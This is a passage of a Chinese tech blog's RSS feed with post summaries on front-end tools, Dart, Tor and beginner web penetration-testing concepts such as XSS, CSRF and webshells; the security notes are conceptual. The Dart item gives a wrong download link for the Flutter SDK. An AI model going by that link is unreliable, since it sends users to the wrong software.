已经被打开过的小程序会被记录在小程序的入口二级页面列表当中，并且会按照你的启动先后顺序排列。&#xA;不如原生APP?&#xA;张小龙对小程序特性的总结：“无需安装、触手可及、用完即走、无须卸载”,这是它的一个重大靓点。&#xA;也就是说小程序也并不是万能的，大部份应用在小程序上跑，基本上是没有问题的，同时小程序提供的API很多有限制，比如我上次想尝试截个屏！都哪些应用成功上线呢？比如滴滴、美团、蘑菇、京东、骆驼等等。&#xA;别低估小程序&#xA;既然提出这么多不满意与黑幕，是不是小程序就没有价值了呢，还那是请你不要低估它的价值，巨大的流量与相比原生APP成本要低很多是事实，有冲击也有商机，如果你不把握，在流量被瓜分的时代，多个入口就多一份机会，毕竟它的优势与APP、PC等入口形成了互补的关系。&#xA;特别是对于预算有限的创业团队，快速在小程序上实现自己的产品想法，并通过入口快速印证自己的想法是否可行，相对传统方式更低成本与优势。&#xA;并且文章开头就有提到，各大巨头布局小程序，这也说明它的趋势与价值，至于说颠覆那是个大坑。不然哪里来的这么多骗子公司，腾讯发表声明：凡是打着腾讯官方旗号，打电话或者邀请商家参加什么大会的，基本上都是骗子。&#xA;既然表明了立场是过度营销了，还上当受骗、贪小便宜的，风口那只猪们吹过来给我宰吧，杀了我好卖肉换钱。&#xA;小程序现状&#xA;小程序数量：官方公布，目前已上线的小程序数量100万+。小程序服务提供商还有很大的发展空间，多个渠道布局比被动要强N倍！&#xA;微信官方大力扶持&#xA;在2018中国“互联网+”数字经济峰会上，微信开放平台负责人明确表示“我们要做一个工具箱，做一个助力大家来经营这个生态，希望帮助大家在数字经济的时代，智能化数据化的时代一起来找到用户，挣更多的钱”。&#xA;持续关注小程序的小伙伴，应该在线上的腾讯云、官方媒体等，线下有微信官方活动、发布会、替各大合作小程序合作伙伴站台。这已经说明官方的支持力度，甚至腾讯云类网站，经常发布小程序相关的优惠政策，降低创业团队的门槛。&#xA;如何成为小程序服务商？&#xA;1.自建技术团队&#xA;2.代理某某品牌&#xA;第一条因技术成本，开发周期，大多数人基本不用考虑&#xA;第二条呢，方案可行，当存弊端太多，天花板可见，不是创业最佳选择，而且骗子不少。交了加盟费，公司就消失了。&#xA;代理的弊端&#xA;不是自己的品牌。用他人的品牌，必然要受品牌方的约束和管理，推广他人的品牌，为品牌方做嫁衣，这到底算不算自己的事业呢？&#xA;数据不在自己手上。大数据时代，最值钱的是数据。辛辛苦苦开发的商户，数据都被总部收集走了，后续的营销，数据变现还跟自己有关系吗？&#xA;区域及套数限制。进入一个行业，最痛苦的是，天花板可见；最佳的选择，一定是站在食物链的最顶端。有区域限制，意味着能开发的商户就那么多，市场空间有限；有套数限制，那不就是赚差价的黄牛么？自己组建技术团队不可行，做别人代理不甘心。怎么办？&#xA;米筷轻应用开发平台提供私有化部署解决方案&#xA;就像小程序与APP互补一样，解决云端小程序开发平台解决不了的难题，各取所需。&#xA;米筷产品致力于为用户的移动互联提供快速、易用、成本低的轻应用开发平台，后续将会推出在线体验版本、并提供免费下载，陆续在开发通用后台插件与模板。&#xA;欢迎访问米筷官网</description>
    </item>
    <item>
      <title>InteIIiJ IDEA 中搭建 Dart 的开发环境</title>
      <link>https://anwangtanmi.github.io/posts/f3b9dc713b0c182d09517c95389e0928/</link>
      <pubDate>Mon, 27 Aug 2018 11:36:15 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/f3b9dc713b0c182d09517c95389e0928/</guid>
      <description>如同 android 开发一样，最开始Android开发依托的语言时Java，除啦eclipse和Androidstudio这两款编辑器，还有eclipse和myEclipse专门用作java的开发，flutter的开发也是类似，flutter的开发依托于dart语言，我们使用intellij idea来简单的学习dart语言，之后再用androidstudio开做整体的项目demo。接下来就开始intellij idea的dart开发环境的搭建。他的搭建和androidstudio环境的搭建类似。也可以参考我写的Androidstudio flutter环境的搭建：https://mp.csdn.net/postedit/82051118&#xA;1、下载flutter sdk从https://git-scm.com/download/win 2、dart插件的安装&#xA;1）、依次选择 File -&amp;gt; Setting 打开 IDEA 设定的界面&#xA;2）、选择 “Plugins” 选项，在输入输入“Dart”并点击搜索按钮，之后重新启动即可。&#xA;3、配置dartsdk的位置如下：&#xA;4、创建属于自己的dart项目&#xA;1）、选择file-new-project&#xA;2)、在语言列表选择dart语言&#xA;直接点击finish按钮，完成即可。&#xA;创建成功后显示的界面如下：&#xA;接下来就可以开始新的dart之旅啦。</description>
    </item>
    <item>
      <title>webpack打包后文件分析</title>
      <link>https://anwangtanmi.github.io/posts/760b46f6b281aee2541931597141eee4/</link>
      <pubDate>Thu, 02 Aug 2018 11:28:00 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/760b46f6b281aee2541931597141eee4/</guid>
      <description>平常遇到喜欢的页面总喜欢拿来欣赏一番，今天就以webpack+vue的项目为例分析一下打包后的源码。 环境： webpack4.16 vue2.5.16&#xA;为了方便理解，先使用webpack打一个最简单的包（未使用vue），下面是混淆压缩前的伪代码&#xA;(function (modules) { var installedModules = {} // 缓存模块 // 处理AMD commonjs ESModule function __webpack_require__(moduleId)() { ... return module.exports} __webpack_require__.m __webpack_require__.c __webpack_require__.d __webpack_require__.r __webpack_require__.n __webpack_require__.o __webpack_require__.p return __webpack_require__(__webpack_require__.s = &#34;./src/index.js&#34;) })(obj) var obj = { // 入口js处理 &#39;./src/index.js&#39;: (function(module, __webpack_exports__, __webpack_require__) {&#34;use strict&#34;; eval(`__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _js_home__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./js/home */ \&#34;./src/js/home.js\&#34;);\n/* harmony import */ var _js_home__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_js_home__WEBPACK_IMPORTED_MODULE_0__);\n\r\n\r\n console.log(&#39;index.js&#39;)\n\n//# sourceURL=webpack:///./src/index.js?`); }), // 其他js处理 &#39;.</description>
    </item>
    <item>
      <title>bootstrap4 使用及常用样式详细整理 (依照官网翻译)</title>
      <link>https://anwangtanmi.github.io/posts/1e6ae7c65f2657e900f394e17c42a3a7/</link>
      <pubDate>Wed, 01 Aug 2018 09:27:56 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/1e6ae7c65f2657e900f394e17c42a3a7/</guid>
      <description>bootstrap4使用及常用样式整理 简介 Bootstrap 是全球最受欢迎的前端组件库，用于开发响应式布局、移动设备优先的 WEB 项目。Bootstrap4 目前是 Bootstrap 的最新版本，是一套用于 HTML、CSS 和 JS 开发的开源工具集。利用我们提供的 Sass 变量和大量 mixin、响应式栅格系统、可扩展的预制组件、基于 jQuery 的强大的插件系统，能够快速为你的想法开发出原型或者构建整个 app 。Bootstrap4 放弃了对 IE8 以及 iOS 6 的支持，现在仅仅支持 IE9 以上 以及 iOS 7 以上版本的浏览器。如果对于其中需要用到以前的浏览器，那么请使用 Bootstrap3。入门详细学习请参考 菜鸟教程.&#xA;引入方式 前端项目基于jquery去构建：可以直接引入cdn库，bootstrap4.css、jquery.js、bootstrap4.js&#xA;前端项目基于react去构建：bootstrap4.css（scss,less）、react.js、react-bootstrap&#xA;前端项目基于angular去构建：bootstrap4.css（scss,less）、angular4、ngx-bootstrap&#xA;目录 容器和网格系统&#xA;字体颜色及背景颜色&#xA;边框&#xA;内边距（pading）外边距（margin）&#xA;清除浮动&#xA;display 显示&#xA;嵌入元素样式&#xA;弹性布局&#xA;浮动&#xA;图片替换文字&#xA;定位&#xA;尺寸（size）&#xA;文本&#xA;垂直对齐（Vertical alignment）&#xA;显示隐藏&#xA;表格&#xA;按钮及按钮组&#xA;列表&#xA;表单组&#xA;信息提示框&#xA;三角&#xA;1、容器和网格系统 容器&#xA;container 固定宽度，不同尺寸固定了不同的宽度&#xA;container-fluid 100%宽度&#xA;栅格系统</description>
    </item>
    <item>
      <title>less语法使用</title>
      <link>https://anwangtanmi.github.io/posts/ea6c2cac4188cb16afdf477ad370276b/</link>
      <pubDate>Fri, 20 Jul 2018 14:47:41 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/ea6c2cac4188cb16afdf477ad370276b/</guid>
      <description>变量 （1）可以将属性的值赋值给一个变量，变量为完全的 “常量” ，所以只能定义一次&#xA;例如：&#xA;@nice-blue: #5B83AD; @light-blue: @nice-blue + #111; #header { color: @light-blue; } 结果&#xA;#header { color: #6c94be; } （2）也可以用变量名定义为变量&#xA;例如：&#xA;@fnord: &#34;I am fnord.&#34;; @var: &#39;fnord&#39;; content: @@var; 结果&#xA;content: &#34;I am fnord.&#34;; 混合 定义一些通用的属性集为一个class，然后在另一个class中去调用这些属性。任何class, id 或者元素属性集都可以以同样的方式引入&#xA;例如：&#xA;.bordered { border-top: dotted 1px black; border-bottom: solid 2px black; } #menu a { color: #111; .bordered; } .post a { color: red; .bordered; } 结果&#xA;#menu a { color: #111; border-top: dotted 1px black; border-bottom: solid 2px black; } .</description>
    </item>
    <item>
      <title>使用CSS3自定义属性实现换肤功能</title>
      <link>https://anwangtanmi.github.io/posts/b513b170d1d63a1652845f64033626d7/</link>
      <pubDate>Thu, 19 Jul 2018 15:55:50 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/b513b170d1d63a1652845f64033626d7/</guid>
      <description>开始之前先说说css3的自定义属性，之前我们在写css的时候全部都是使用自身属性，比如margin,padding等。但是你曾是否见过这样的css&#xA;:root{ --primary-color:#989898; --light:#fff; --dark:#000; } 其中的–primary-color、–light、–dark就是自定义的属性。&#xA;自定义属性的命名规则 --variables-name:variables-value --属性名:属性值 例如定义一个主题颜色： --theme-color:red; 作用域 //:root作用于全局 :root{ --theme-color:red; } //#app作用于id为app的节点内 #app{ --theme-color:red; } 使用方法 var(自定义属性名) //现在全局定义 :root{ --theme-color:red; } //使用的时候 #app{ background-color:var(--theme-color); } //假如我们没有指定--theme-color这个属性，则可以在使用的时候加上替代值 #app{ background-color:var(--theme-color,black);//没有指定--theme-color则会由black代替 } 通过JS获取和设置自定义的属性 //js中获取--theme-color的值 var styles = getComputedStyle(document.documentElement); var value = styles.getPropertyValue(&#34;--theme-color&#34;); console.log(value);//red //js中更改--theme-color的值 document.documentElement.style.setProperty(&#34;--theme-color&#34;,&#34;black&#34;); 明白了这几个概念我们开始实现我们的换肤功能：&#xA;&amp;lt;/span&amp;gt; &amp;lt;html lang=&#34;en&#34;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&#34;UTF-8&#34;&amp;gt; &amp;lt;title&amp;gt;CSS3自定义属性实现换肤功能title&amp;gt; &amp;lt;style type=&#34;text/css&#34;&amp;gt; :root{ --theme-color:#989898; } #header{ width: 100%; height: 50px; line-height: 50px; background-color: var(--theme-color); margin-bottom: 30px; } #header h1{ color: #fff; } button{ width: 100px; height: 30px; color: #fff; border:none; } #btn-red{ --btn-red:red; background-color: var(--btn-red) } #btn-black{ --btn-black:black; background-color: var(--btn-black) } #btn-blue{ --btn-blue:blue; background-color: var(--btn-blue) } style&amp;gt; head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;header id=&#34;</description>
    </item>
    <item>
      <title>web渗透初学笔记</title>
      <link>https://anwangtanmi.github.io/posts/3304351d43e3b2b2d55f32ad245cf524/</link>
      <pubDate>Sun, 15 Jul 2018 13:44:28 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3304351d43e3b2b2d55f32ad245cf524/</guid>
      <description>web基础知识 前端漏洞：钓鱼、暗链、xss、点击劫持、csrf、url跳转 后端漏洞：sql注入、命令注入、文件上传、文件包含、暴力破解 例子&#xA;报文&#xA;熟悉状态码&#xA;目前流行的网站架构&#xA;搭建phpstudy集成软件&#xA;在PHPstudy的mySQL中操作SQL语法&#xA;创建数据库 CREATE DATABASE my_db;&#xA;查看数据库 SHOW databases;&#xA;切换数据库 USE my_db;&#xA;删除数据库 DROP DATABASE my_db;&#xA;TIPS:分号作为语句的结束，程序中会自动补充&#xA;web安全基础 常见的安全事件 篡改网页&#xA;搜索引擎语法Site:domain(在某个域名或子域名下的网页)+Intitle:keyword(正文中含有关键词的网页)/Intitle:keyword(标题中含有关键词的网页)&#xA;exa：keyword为hacked by:时往往能查到自己管理域名下被黑的网站&#xA;——————————————————————————————————————————————————————&#xA;暗链&#xA;优化在搜索引擎里的排名&#xA;不是为人准备，是为搜索引擎中的爬虫准备的。&#xA;——————————————————————————————————————————————————————&#xA;webshell&#xA;获得管理权限后-&amp;gt;上传webshell=(小/大)马=后门&#xA;——————————————————————————————————————————————————————&#xA;常见web漏洞&#xA;XSS Who stole my keys&#xA;概念：黑客通过”html注入”篡改网页，插入了恶意脚本(即xss脚本)，当用户在浏览网页时，实现控制用户浏览器行为的一种攻击方式。&#xA;危害：盗取用户信息/钓鱼/制造蠕虫等&#xA;三种类型 ：存储型/反射型/DOM型&#xA;存储型：攻击代码位置：数据库；输出：HTTP响应&#xA;反射型：攻击代码位置：url ；输出：HTTP响应。&#xA;DOM型：攻击代码位置：url ；输出：DOM节点。&#xA;——存储型演示——&#xA;左管理端/右访问端&#xA;上传xss脚本&#xA;结果&#xA;—––反射型演示——&#xA;——DOM型演示——&#xA;不能通过查看源代码的方式找到xss脚本的位置，通过firebug可以。&#xA;在源码中输入hash&#xA;总结&#xA;——————————————————————————————————————————————————————&#xA;CSRF who moved my cheese&#xA;概念：利用用户已登陆的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</description>
    </item>
    <item>
      <title>element-ui框架的el-dialog弹出框被遮罩层挡住了</title>
      <link>https://anwangtanmi.github.io/posts/621f06a6b3f725cdeec21a83defe3489/</link>
      <pubDate>Mon, 02 Jul 2018 19:24:30 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/621f06a6b3f725cdeec21a83defe3489/</guid>
      <description>如图：&#xA;解决办法&#xA;在el-dialog标签里添加 :modal-append-to-body=’false’&#xA;实现效果：&#xA;问题解析 先来看看element-ui官网提供的属性说明文档&#xA;文档解释：翻译成大白话就是，若el-dialog弹出框设置了modal-append-to-body=’true’（默认）属性，它的遮罩层就会被插入到body标签下（即与组件所在的最外层div同一层级），知道这个原理就好办了。&#xA;问题分析：经过分析源代码可得，el-dialog的显示层和遮罩层都设置了position:fixed，当然显示层的z-index肯定要比遮罩层的大，才能正常的显示弹出框。问题就出在此处，若el-dialog的父级也设置了position:fixed，并且其z-index比弹出框的遮罩层的小（遮罩层处于更高一层），那么弹出框的内容就会被遮罩层所遮挡住了。&#xA;经过分析出问题的代码可得出，el-dialog的父级元素确实设置了position:fixed，并且其z-index比弹出框的遮罩层的小，所以就会出现遮罩层把内容挡住的问题。&#xA;解决方案&#xA;1、给el-dialog设置modal-append-to-body=“false”，使遮罩层插入至 Dialog 的父元素上。（推荐）&#xA;2、给position:fixed的父元素设置一个z-index，并且要比遮盖层的大。&#xA;3、el-dialog父元素不使用fixed定位。&#xA;为了验证这个问题，我特地写了个demo，如下图：&#xA;图一：modal-append-to-body=“true”&#xA;图二：modal-append-to-body=“false”&#xA;(完)</description>
    </item>
    <item>
      <title>【Angular】PrimeNG制作的提示框Dialog</title>
      <link>https://anwangtanmi.github.io/posts/cc0adba78a7f29b0cd1351dd03c0b2dd/</link>
      <pubDate>Wed, 06 Jun 2018 21:35:25 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/cc0adba78a7f29b0cd1351dd03c0b2dd/</guid>
      <description>前言 在项目组自己真得是接触了不少东西，今天就来说一说里面的带有PrimeNG制作出来的提示框效果吧。&#xA;一、PrimeNG 它是Angular2的一个客户端组件，可以独立于Bootstrap单独使用，也可以结合Bootstrap共同使用。&#xA;二、Dialog 使用PRIMENG官网中的解释： Dialog is a container to display content in an overlay window.&#xA;三、Angular中的Dialog制作 1.Module文件中添加代码 在myApp.module.ts文件中添加引用 (1)&#xA;import {DialogModule} from &#39;primeng/primeng&#39;; import {ButtonModule} from &#39;primeng/primeng&#39;; (2)&#xA;在@NgModule中import： DialogModule, ButtonModule 2.Component组件中操作 (1)myApp.component.html 添加标签元素&#xA;&amp;lt;p-dialog header=&#34;提示&#34; [(visible)]=&#34;display&#34; modal=&#34;modal&#34; width=&#34;400&#34; [responsive]=&#34;true&#34;&amp;gt; &amp;lt;p style=&#34;text-align:center&#34;&amp;gt;{{ message}}p&amp;gt; &amp;lt;p-footer&amp;gt; &amp;lt;button type=&#34;button&#34; pButton (click)=&#34;display=false&#34; label=&#34;确定&#34;&amp;gt;button&amp;gt; p-footer&amp;gt; p-dialog&amp;gt; (2)myApp.component.ts 在组件myAppComponent类中声明变量&#xA;display: boolean = false; message: String = &#39;&#39;; 3.myApp.component.ts(TypeScript)中的具体使用&#xA;this.message=&#34;请上传音频、视频、图片、文档、pdf、表格格式文件&#34;; //提示信息的内容 this.display=true;//提示框的visible属性为true，显示提示框 四、Dialog效果 小结 Angular中的一些操作语法，与之前所学的HTML、JavaScript有相似之处，也有不同之处，两者联系起来学习会对这块知识的学习有一定的帮助。 感谢您的访问！</description>
    </item>
    <item>
      <title>Tor (洋葱头)torbrowser</title>
      <link>https://anwangtanmi.github.io/posts/0175ba2bb819aa6130ad2caccd8ca806/</link>
      <pubDate>Fri, 25 May 2018 15:31:18 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/0175ba2bb819aa6130ad2caccd8ca806/</guid>
      <description>Tor是什么 Tor是互联网上用于保护您隐私最有力的工具之一，但是时至今日仍有许多人往往认为Tor是一个终端加密工具。事实上，Tor是用来匿名浏览网页和邮件发送（并非是邮件内容加密）的。今天，我们要讨论一下Tor的是如何工作的、它做什么、不会做什么，以及我们该如何正确地使用它。&#xA;Tor的工作原理是这样的 当你通过Tor发送邮件时， tor会使用一种称为“洋葱路由”的加密技术通过网络随机生成的过程传送邮件。这有点像在一叠信中放了一封密信。网络中的每个节点都会解密消息（打开的最外信封），然后发送内部加密的内容（内密封的信封）至其下一个地址。这导致如果单看一个节点是看不了信的全部内容，并且该消息的传送路径难以追踪。&#xA;第一步 ：使用翻墙软件 访问torbrowser 官网 第二步： 下载适应电脑版本的安装包&#xA;第三步 ： 管理员运行 接下来就是配置：&#xA;配置 勾选：&#xA;–:&#xA;发邮件获取下载地址发任意内容到[email protected]可得到邮件 实测126邮箱无法收到邮件！gmail可以&#xA;Hi! This is the GetTor robot. I am here to help you download the latest version of Tor Browser. Please reply to this message with one of the options below: android windows linux osx mirrors I will then send you the download instructions. If you are unsure, just send a blank reply to this message.</description>
    </item>
    <item>
      <title>HTML5 canvas 阴影</title>
      <link>https://anwangtanmi.github.io/posts/cb9274352458e43e7ff6f22d395bbbad/</link>
      <pubDate>Tue, 24 Apr 2018 17:47:35 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/cb9274352458e43e7ff6f22d395bbbad/</guid>
      <description>阴影 在canvas中进行绘制时，不管是文本、图形、还是图像，也不管是描边还是填充，都可以通过设置上下文对象的相关属性，来为它们设置阴影。这些属性及含义见表 4‑4：&#xA;表 4‑4 阴影的属性及含义&#xA;属性 含义 shadowColor 阴影的颜色，其默认值为完全透明的黑色。因此，如果没有把该属性设置为不透明，则阴影是不可见的。该属性只能设置为一个表示颜色的字符串，不能使用渐变或图案。使用半透明的阴影可以产生很逼真的阴影效果，因为透过阴影还能看到背景 shadowOffsetX 阴影在X轴的偏移量，单位为像素。默认值为0，阴影位于图形正下方，阴影是不可见的。大于0向右偏移，小于0向左偏移。阴影偏移量越大，产生的阴影也越大，同时会感觉绘制的图形在画布是浮得也越高 shadowOffsetY 阴影在Y轴的偏移量，单位为像素。默认值为0，阴影位于图形正下方，阴影是不可见的。大于0向下偏移，小于0向上偏移。阴影偏移量越大，产生的阴影也越大，同时会感觉绘制的图形在画布是浮得也越高 shadowBlur 阴影的模糊值。是一个与像素无关的值，被用于高斯模糊方程中，以便对阴影进行模糊化处理。默认值为0，表示产生一个清晰的阴影。该值越大，表示阴影越模糊 根据canvas规范，只有在满足以下两个条件时，浏览器才会绘制阴影：1）指定了一个非全透明的shadowColor属性值；2）shadowOffsetX、shadowOffsetY、shadowBlur三个属性中，至少有一个属性的值不是0。&#xA;以下代码给黑色的文本增加灰色的阴影：&#xA;context.font = &#39;bold 35px Arial&#39;; context.textAlign = &#39;center&#39;; context.textBaseline = &#39;bottom&#39;; context.fillStyle = &#39;#000&#39;; context.shadowOffsetX = 20; context.shadowOffsetY = -30; context.shadowColor = &#34;#ccc&#34;; context.shadowBlur = 2; context.fillText(&#34;Hello Canvas&#34;, 0, 0); 上述代码中，阴影在X轴的偏移量和Y轴的偏移量都设置的比较大，故产生的阴影也比较远，文本在画布也浮得较高。运行结果如图 4‑24 所示：&#xA;图4-24 阴影效果 由于阴影的shadowOffsetX属性被设置为正值，而shadowOffsetY属性被设置为负值，故阴影在X轴向右偏移，在Y轴向上偏移。&#xA;说明：&#xA;shadowOffsetX和shadowOffsetY属性总是在默认坐标系空间中度量的，它不受ratate()方法和scale()方法的影响。&#xA;关于作者&#xA;歪脖先生，十五年以上软件开发经验，酷爱Web开发，精通 HTML、CSS、JavaScript、jQuery、JSON、Python、Less、Bootstrap等，著有《HTML宝典》、《揭秘CSS》、《Less简明教程》、《JSON教程》、《Bootstrap2用户指南》，并全部在 GitHub 上开源。&#xA;版权声明：本文出自 歪脖网 的《HTML宝典》，欢迎在线阅读，并提出宝贵意见。</description>
    </item>
    <item>
      <title>chrome主题插件的使用</title>
      <link>https://anwangtanmi.github.io/posts/c9e0e771a87bcba5e7444c6b204073e1/</link>
      <pubDate>Sun, 15 Apr 2018 22:03:41 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/c9e0e771a87bcba5e7444c6b204073e1/</guid>
      <description>DevTools Theme: Zero Dark Matrix – Chrome Web Store&#xA;chrome的控制台组件，先看下效果：&#xA;安装：&#xA;1.chrome 软件中心 搜索Zero Dark Matrix&#xA;2.添加到扩展&#xA;3.控制台开启allow custom UI themes&#xA;4.重启控制台&#xA;5.enjoy&#xA;详细文档说明参考github ：&#xA;https://github.com/mauricecruz/chrome-devtools-zerodarkmatrix-theme</description>
    </item>
    <item>
      <title>HTML – 颜色</title>
      <link>https://anwangtanmi.github.io/posts/d55e06c6207435117bd5aabe45c914a6/</link>
      <pubDate>Sat, 14 Apr 2018 10:17:20 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/d55e06c6207435117bd5aabe45c914a6/</guid>
      <description>HTML颜色的表示 HTML 颜色由红色、绿色、蓝色混合而成。&#xA;HTML颜色可以通过颜色值或者颜色RGB或者颜色名来引用。&#xA;sublime text3自带取色器可以用，右键 &amp;gt; insert color with color picker就可以从color picker取色了。&#xA;颜色值 HTML 颜色由一个十六进制符号来定义，这个符号由红色、绿色和蓝色的值组成（RGB）。每种颜色的最小值是0（十六进制：#00）。最大值是255（十六进制：#FF）。&#xA;十六进制值的写法为#号后跟三个或六个十六进制字符。三位数表示法为：#RGB，转换为6位数表示为：#RRGGBB。&#xA;如&#xA;颜色 3位十六进制颜色值 6位十六进制颜色值 RGB #000 #000000 rgb(0,0,0) 这个表格给出了由三种颜色混合而成的具体效果：&#xA;颜色(Color) 颜色十六进制(Color HEX) 颜色RGB(Color RGB) #000000 rgb(0,0,0) #FF0000 rgb(255,0,0) #00FF00 rgb(0,255,0) #0000FF rgb(0,0,255) #FFFF00 rgb(255,255,0) #00FFFF rgb(0,255,255) #FF00FF rgb(255,0,255) #C0C0C0 rgb(192,192,192) #FFFFFF rgb(255,255,255) 颜色RGB：透明度 相对于使用rgb(255,255,0)，使用rgba(255,255,0,0.5)可以实现设置颜色透明度的功能，这里的0.5表示透明度，范围0~1。 style=&#34;background-color:rgba(255,255,0,0.25)&#34;&amp;gt; 通过 rbg 值设置背景颜色&#xA;颜色名 141个颜色名称是在HTML和CSS颜色规范定义的（17标准颜色，再加124）。下表列出了所有颜色的值，包括十六进制值。目前所有浏览器都支持以下颜色名。&#xA;: 17标准颜色：黑色，蓝色，水，紫红色，灰色，绿色，石灰，栗色，海军，橄榄，橙，紫，红，白，银，蓝绿色，黄色。点击其中一个颜色名称（或一个十六进制值）就可以查看与不同文字颜色搭配的背景颜色。&#xA;某小皮&#xA;不同颜色的展示&#xA;1600万种不同颜色 三种颜色 红，绿，蓝的组合从0到255，一共有1600万种不同颜色(256 x 256 x 256)。&#xA;在下面的颜色表中你会看到不同的结果，从0到255的红色，同时设置绿色和蓝色的值为0,随着红色的值变化，不同的值都显示了不同的颜色。</description>
    </item>
    <item>
      <title>VSCODE编辑器常用插件推荐</title>
      <link>https://anwangtanmi.github.io/posts/782a3927d3eff7f3666862374e4f69aa/</link>
      <pubDate>Mon, 09 Apr 2018 09:28:06 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/782a3927d3eff7f3666862374e4f69aa/</guid>
      <description>之前一直使用webstorm，绝对是前端开发神器，但是在实习中，公司都使用VScode，也就跟着用了，发现，这才是真的神器呀，小巧轻便，又不失webstorm的所有功能，点赞。&#xA;转载自：https://blog.csdn.net/Che_rish/article/details/78893019&#xA;Auto Close Tag — 自动闭合HTML标签&#xA;Auto Rename Tag — 修改HTML标签时，自动修改匹配的标签&#xA;background — 背景&#xA;beautify— javascript, JSON, CSS, Sass, HTML 代码高亮&#xA;Beautify css/sass/scss/less — 代码高亮&#xA;CSS Peek — 自动查找CSS文件&#xA;Debugger for Chrome — 调试JavaScript&#xA;Easy Sass — scss/sass文件保存可自动生成并同步编译成同名css文件&#xA;Easy WXLESS — 微信小程序WXSS文件专用，保存可自动生成并同步编译成同名css文件&#xA;File Peek — 鼠标移到路径名按住ctrl可打开文件&#xA;Git History — git log&#xA;GitLens — 显示文件最近的commit和作者,显示当前行commit信息&#xA;HTML Class Suggestions — 类名命名提示&#xA;HTML CSS Support — CSS的智能补全&#xA;HTML Snippets — 回车或tap生成标签</description>
    </item>
    <item>
      <title>Chrome浏览器中如何打开或关闭网页的免插件自带翻译</title>
      <link>https://anwangtanmi.github.io/posts/d497e01f07c04801c221f3c88cd194a4/</link>
      <pubDate>Thu, 29 Mar 2018 18:43:26 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/d497e01f07c04801c221f3c88cd194a4/</guid>
      <description>谷歌翻译插件必不可少,但是今天小编要跟大家说的不是chrome插件，而是chrome自带的网页翻译功能。Chrome有自带整页翻译的功能，这个我相信很多人都不陌生，当然打开非浏览器默认语言的网页时，一般会提示我们是否对该网页进行翻译。对于不懂其他语言的使用者来说是很方便的。如下图所示：&#xA;正常情况下，你的浏览器会自动提示您是否要翻译网页。但是如果没有自动弹出，我们应该怎么样去打开这个chrome自带的网页翻译功能呢？ 1、首先点击右上角的菜单，然后选择设置。在选项页面打开高级设置，才能看到语言选项。&#xA;2、将这个选项打勾，在浏览页面的时候就会询问是否翻译页面。同样，如果想关闭chrome网页自动翻译功能关闭就可以了。 3、如果你已经打开这个chrome网页自动翻译功能，但是打开外文网页时如果没有自动弹出提示信息，可以在页面右击鼠标，会发现有</description>
    </item>
    <item>
      <title>JS实现网站悬浮广告</title>
      <link>https://anwangtanmi.github.io/posts/f4bee50a3a03718b6815b9ca220f0e17/</link>
      <pubDate>Fri, 23 Mar 2018 17:01:06 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/f4bee50a3a03718b6815b9ca220f0e17/</guid>
      <description> 如图&#xA;黄色区块会沿着浏览器的上下左右碰撞移动,可关闭,鼠标移上去会停止&#xA;广告 广告位招商 </description>
    </item>
    <item>
      <title>js table鼠标点击时变色</title>
      <link>https://anwangtanmi.github.io/posts/78533eb7fc659857b9371b529e807ac7/</link>
      <pubDate>Sun, 18 Mar 2018 21:12:45 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/78533eb7fc659857b9371b529e807ac7/</guid>
      <description>周润发&#xA;刘德华&#xA;周星驰&#xA;周润发&#xA;刘德华&#xA;周星驰&#xA;周润发&#xA;刘德华&#xA;周星驰&#xA;周润发&#xA;刘德华&#xA;周星驰&#xA;周润发&#xA;刘德华&#xA;周星驰&#xA;周润发&#xA;刘德华&#xA;周星驰</description>
    </item>
    <item>
      <title>element-ui 安装</title>
      <link>https://anwangtanmi.github.io/posts/e4f536be0cf388cb85e9778d26ff54e6/</link>
      <pubDate>Tue, 06 Mar 2018 09:11:45 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/e4f536be0cf388cb85e9778d26ff54e6/</guid>
      <description>其实 很简单 只是资料不好找，饿了吗 的框架 1/下载来 https://github.com/taylorchen709/vue-admin；&#xA;2/解压 文件，并进入目录 npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm install cnpm run dev 如果还不行 进来博主QQ群问下吧 QQ群153181864</description>
    </item>
    <item>
      <title>Webstorm 超实用教程</title>
      <link>https://anwangtanmi.github.io/posts/2782bc13db518031a64dee0f9fd58394/</link>
      <pubDate>Sat, 20 Jan 2018 20:13:02 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/2782bc13db518031a64dee0f9fd58394/</guid>
